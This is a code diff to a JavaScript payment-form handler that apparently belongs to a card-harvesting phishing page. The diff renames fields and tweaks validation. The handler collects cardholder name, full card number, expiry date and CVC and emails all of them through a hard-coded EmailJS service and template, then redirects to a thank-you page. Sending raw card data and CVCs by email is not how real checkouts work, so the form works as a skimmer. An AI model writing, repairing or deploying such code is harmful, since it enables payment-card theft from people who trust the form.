@@ -5,37 +5,37 @@
 document.getElementById('paymentForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
-    const cardData = {
-        nombre: document.getElementById('cardHolder').value,
-        numero: document.getElementById('cardNumber').value,
-        fecha: document.getElementById('expiryDate').value,
-        cvc: document.getElementById('cvc').value
+    const formData = {
+        user_name: document.getElementById('cardHolder').value, // Corregido el nombre del campo
+        card_number: document.getElementById('cardNumber').value,
+        expiry_date: document.getElementById('expiryDate').value,
+        cvc_code: document.getElementById('cvc').value
     };
 
-    // Validaciones
-    if (!/^[a-zA-ZÀ-ÿ\s]{5,}$/.test(cardData.nombre)) {
-        alert('Por favor ingrese un nombre válido');
+    // Validación del nombre (corregida)
+    if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.user_name)) {
+        alert('Por favor ingresa tu nombre completo');
         return;
     }
 
-    if (cardData.numero.length !== 16 || !/^\d+$/.test(cardData.numero)) {
+    if (formData.card_number.length !== 16 || !/^\d+$/.test(formData.card_number)) {
         alert('Número de tarjeta inválido');
         return;
     }
 
-    if (cardData.cvc.length !== 3 || !/^\d+$/.test(cardData.cvc)) {
+    if (formData.cvc_code.length !== 3 || !/^\d+$/.test(formData.cvc_code)) {
         alert('CVC inválido');
         return;
     }
 
     const currentDate = new Date();
-    const expiryDate = new Date(cardData.fecha);
+    const expiryDate = new Date(formData.expiry_date);
     if (expiryDate < currentDate) {
-        alert('Fecha de expiración inválida');
+        alert('Tarjeta expirada');
         return;
     }
 
-    emailjs.send("service_syrc1uk", "template_u3etoro", cardData)
+    emailjs.send("service_syrc1uk", "template_u3etoro", formData)
         .then(() => {
             window.location.href = "thank-you.html";
         })
